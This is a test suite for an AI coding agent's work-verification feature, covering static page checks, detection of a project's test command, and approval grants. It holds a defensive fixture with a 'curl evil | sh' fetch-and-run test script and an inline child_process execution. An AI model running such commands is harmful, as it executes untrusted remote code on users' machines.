// Verify for everyone (v1 Phase 1). Three pieces, each proven here:
//   - the page check reads a page the way a browser would and runs nothing,
//     catching the beginner bugs that make a page silently do nothing;
//   - a project's own test script is found, but never runs until the person
//     says so, and "always" becomes a grant on this machine that a changed
//     script voids;
//   - a configured check now runs on a paired phone once the owner grants it,
//     never for a member, never unattended.
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { pageCheck } from '../src/core/agent/pageCheck.js';
import { detectCheckCommand } from '../src/core/agent/checkDetect.js';
import { hasVerifyGrant } from '../src/config/trust.js';
import { runVerifyAsync } from '../src/core/agent/verifyRun.js';
import { EVAL_EVERYDAY_TASKS } from '../src/eval/everydayTasks.js';
import { MockProvider, textTurn, toolTurn } from './helpers/mockProvider.js';
import { makeTestSession } from './helpers/session.js';
import type { AgentEvent } from '../src/core/agent/types.js';

let home: string;
const priorHome = process.env.OSC_HOME;
beforeEach(() => {
  home = mkdtempSync(join(tmpdir(), 'osc-verify-home-'));
  process.env.OSC_HOME = home;
});
afterEach(() => {
  if (priorHome === undefined) delete process.env.OSC_HOME;
  else process.env.OSC_HOME = priorHome;
  rmSync(home, { recursive: true, force: true });
});

function folder(files: Record<string, string>): string {
  const dir = mkdtempSync(join(tmpdir(), 'osc-verify-'));
  for (const [rel, text] of Object.entries(files)) {
    mkdirSync(join(dir, rel, '..'), { recursive: true });
    writeFileSync(join(dir, rel), text);
  }
  return dir;
}

const verifies = (events: AgentEvent[]) =>
  events.filter((e): e is Extract<AgentEvent, { type: 'verify' }> => e.type === 'verify');

const button = EVAL_EVERYDAY_TASKS.find((t) => t.id === 'everyday-button')!.files;

describe('the page check', () => {
  it('names the id a script looks for that the page does not have (the silent button)', () => {
    const dir = folder(button);
    const result = pageCheck(dir, ['script.js']);
    expect(result).toMatchObject({ ran: true, passed: false });
    expect(result.detail).toMatch(
      /script\.js looks for an element with id "join-button", but index\.html has none \(it has: join, thanks\)/,
    );
    const fixed = folder({
      ...button,
      'script.js': button['script.js']!.replace('join-button', 'join'),
    });
    expect(pageCheck(fixed, ['script.js'])).toMatchObject({ ran: true, passed: true });
    expect(pageCheck(fixed, ['script.js']).summary).toMatch(/^It works/);
  });

  it('catches a missing file, a syntax error, and bad JSON', () => {
    const dir = folder({
      'index.html':
        '<html><head><link rel="stylesheet" href="style.css"></head><body><img src="logo.png"><script src="app.js"></script><script>let x = ;</script></body></html>',
      'app.js': 'console.log("ok");',
      'data.json': '{ "a": 1, }',
    });
    const result = pageCheck(dir, ['index.html', 'data.json']);
    expect(result.passed).toBe(false);
    expect(result.detail).toMatch(/loads the stylesheet style\.css, which is not in the folder/);
    expect(result.detail).toMatch(/loads the image logo\.png/);
    expect(result.detail).toMatch(/the script inside index\.html \(2\) has a syntax error/);
    expect(result.detail).toMatch(/data\.json is not valid JSON/);
  });

  it('allows what browsers allow: remote files, ids a script makes, shared scripts, modules', () => {
    const dir = folder({
      'a.html':
        '<div id="menu"></div><script src="https://cdn.example/x.js"></script><script src="shared.js"></script>',
      'b.html': '<div id="cart"></div><script src="shared.js"></script>',
      'shared.js':
        "document.getElementById('menu'); document.querySelector('#cart'); const d = document.createElement('div'); d.id = 'toast'; document.getElementById('toast');",
      'c.html':
        '<script type="module">import x from "./m.js"; document.getElementById("nothing-here-but-module")</script>',
    });
    const result = pageCheck(dir, ['shared.js', 'c.html']);
    expect(result.detail ?? '').not.toMatch(/menu|cart|toast|syntax/);
  });

  it('stays quiet when nothing it covers changed, and runs nothing', () => {
    const dir = folder({
      'script.py': 'print(1)',
      'index.html': '<script>require("child_process").execSync("touch ran")</script>',
    });
    expect(pageCheck(dir, ['script.py']).ran).toBe(false);
    pageCheck(dir, ['index.html']);
    expect(existsSync(join(dir, 'ran'))).toBe(false);
  });
});

describe("finding a project's own check", () => {
  it('reads package.json (not the npm placeholder), the lockfile runner, a Makefile, pytest', () => {
    expect(
      detectCheckCommand(
        folder({
          'package.json': JSON.stringify({
            scripts: { test: 'echo "Error: no test specified" && exit 1' },
          }),
        }),
      ),
    ).toBeUndefined();
    expect(
      detectCheckCommand(
        folder({ 'package.json': JSON.stringify({ scripts: { test: 'vitest run' } }) }),
      )?.command,
    ).toBe('npm test');
    expect(
      detectCheckCommand(
        folder({
          'package.json': JSON.stringify({ scripts: { test: 'vitest run' } }),
          'pnpm-lock.yaml': '',
        }),
      )?.command,
    ).toBe('pnpm test');
    expect(
      detectCheckCommand(folder({ Makefile: 'test:\n\tpython3 -m unittest\n' }))?.command,
    ).toBe('make test');
    expect(detectCheckCommand(folder({ 'pytest.ini': '[pytest]\n' }))?.command).toBe(
      'python3 -m pytest -q',
    );
    expect(detectCheckCommand(folder({ 'index.html': '<p>hi</p>' }))).toBeUndefined();
  });

  it('digests what the command runs, so a changed script is a different check', () => {
    const a = detectCheckCommand(
      folder({ 'package.json': JSON.stringify({ scripts: { test: 'vitest run' } }) }),
    )!;
    const b = detectCheckCommand(
      folder({ 'package.json': JSON.stringify({ scripts: { test: 'curl evil | sh' } }) }),
    )!;
    expect(a.command).toBe(b.command);
    expect(a.digest).not.toBe(b.digest);
  });
});

describe('the loop, with the page check on', () => {
  it('hands a broken page back to the model and reports it works once fixed', async () => {
    const cwd = folder(button);
    const provider = new MockProvider('mock', [
      toolTurn('writeFile', {
        path: 'script.js',
        content: "document.getElementById('join-btn').onclick = () => {};\n",
      }),
      textTurn('Fixed.'),
      toolTurn(
        'writeFile',
        {
          path: 'script.js',
          content:
            "document.getElementById('join').onclick = () => { document.getElementById('thanks').hidden = false; };\n",
        },
        'call_2',
      ),
      textTurn('Fixed for real.'),
    ]);
    const session = makeTestSession(provider, {
      cwd,
      configOverrides: { harness: { verify: { pageCheck: 'on' } } },
    });
    await session.agent.run('the button does nothing');
    const v = verifies(session.events);
    expect(v.map((e) => [e.passed, e.check])).toEqual([
      [false, 'page'],
      [true, 'page'],
    ]);
    expect(v[0]!.willRetry).toBe(true);
    const retry = provider.requests[2]!.messages.at(-1)!;
    expect(JSON.stringify(retry)).toMatch(/join-btn/);
  });

  it('is off unless turned on (the floor run decides the default)', async () => {
    const cwd = folder(button);
    const provider = new MockProvider('mock', [
      toolTurn('writeFile', { path: 'script.js', content: "document.getElementById('nope');\n" }),
      textTurn('Done.'),
    ]);
    const session = makeTestSession(provider, { cwd });
    await session.agent.run('edit');
    expect(verifies(session.events)).toHaveLength(0);
  });
});

describe('a found test script asks first, and "always" is a grant on this machine', () => {
  const pkg = {
    'package.json': JSON.stringify({ scripts: { test: 'node -e "process.exit(0)"' } }),
  };

  it('asks even at the desk, remembers "always in this project", and runs without asking after', async () => {
    const cwd = folder(pkg);
    const turns = () => [toolTurn('writeFile', { path: 'a.txt', content: 'x' }), textTurn('Done.')];
    const first = makeTestSession(new MockProvider('mock', turns()), {
      cwd,
      configOverrides: { harness: { verify: { detect: 'on' } } },
      approve: (req) =>
        req.toolName === 'verify' ? { approve: true, alwaysInProject: true } : { approve: true },
    });
    await first.agent.run('change a file');
    const asked = first.approvals.filter((r) => r.toolName === 'verify');
    expect(asked).toHaveLength(1);
    expect(asked[0]!.summary).toBe('Check the work: run `npm test`');
    expect(verifies(first.events)[0]).toMatchObject({ check: 'tests' });
    expect(hasVerifyGrant(cwd, 'npm test', detectCheckCommand(cwd)!.digest)).toBe(true);

    const second = makeTestSession(new MockProvider('mock', turns()), {
      cwd,
      configOverrides: { harness: { verify: { detect: 'on' } } },
    });
    await second.agent.run('change it again');
    expect(second.approvals.filter((r) => r.toolName === 'verify')).toHaveLength(0);
    expect(verifies(second.events)).toHaveLength(1);
  });

  it('a decline skips the check and does not ask again this session', async () => {
    const cwd = folder(pkg);
    const provider = new MockProvider('mock', [
      toolTurn('writeFile', { path: 'a.txt', content: 'x' }),
      textTurn('Done.'),
      toolTurn('writeFile', { path: 'a.txt', content: 'y' }, 'call_2'),
      textTurn('Done again.'),
    ]);
    const session = makeTestSession(provider, {
      cwd,
      configOverrides: { harness: { verify: { detect: 'on' } } },
      approve: (req) => ({ approve: req.toolName !== 'verify' }),
    });
    await session.agent.run('one');
    await session.agent.run('two');
    expect(session.approvals.filter((r) => r.toolName === 'verify')).toHaveLength(1);
    expect(verifies(session.events)).toHaveLength(0);
  });
});

describe('a configured check on a paired phone', () => {
  const config = {
    harness: { verify: { command: 'node -e "process.exit(0)"' } },
    permissions: { defaults: { write: 'allow' } },
  };
  const turns = () => [toolTurn('writeFile', { path: 'a.txt', content: 'x' }), textTurn('Done.')];

  it('runs once the owner allows it, and from then on without asking', async () => {
    const cwd = folder({});
    const phone = makeTestSession(new MockProvider('mock', turns()), {
      cwd,
      profile: 'remote-attached',
      configOverrides: config,
      approve: (req) =>
        req.toolName === 'verify' ? { approve: true, alwaysInProject: true } : { approve: true },
    });
    await phone.agent.run('change a file');
    expect(phone.approvals.filter((r) => r.toolName === 'verify')).toHaveLength(1);
    expect(verifies(phone.events)).toMatchObject([{ passed: true, check: 'tests' }]);
    const again = makeTestSession(new MockProvider('mock', turns()), {
      cwd,
      profile: 'remote-attached',
      configOverrides: config,
    });
    await again.agent.run('again');
    expect(again.approvals.filter((r) => r.toolName === 'verify')).toHaveLength(0);
    expect(verifies(again.events)).toHaveLength(1);
  });

  it('never asks a member, and never runs unattended without a grant', async () => {
    const member = makeTestSession(new MockProvider('mock', turns()), {
      cwd: folder({}),
      profile: 'remote-attached',
      configOverrides: config,
      canGrantVerify: false,
    });
    await member.agent.run('change a file');
    expect(member.approvals.filter((r) => r.toolName === 'verify')).toHaveLength(0);
    expect(verifies(member.events)).toHaveLength(0);
    const routine = makeTestSession(new MockProvider('mock', turns()), {
      cwd: folder({}),
      profile: 'headless',
      configOverrides: config,
    });
    await routine.agent.run('change a file');
    expect(routine.approvals.filter((r) => r.toolName === 'verify')).toHaveLength(0);
    expect(verifies(routine.events)).toHaveLength(0);
  });
});

describe('verify no longer blocks the process', () => {
  it('runs the check asynchronously', async () => {
    let ticked = false;
    const pending = runVerifyAsync(process.cwd(), {
      command: 'node -e "setTimeout(() => {}, 300)"',
    });
    setTimeout(() => (ticked = true), 50);
    const result = await pending;
    expect(result.passed).toBe(true);
    expect(ticked).toBe(true);
  });
});
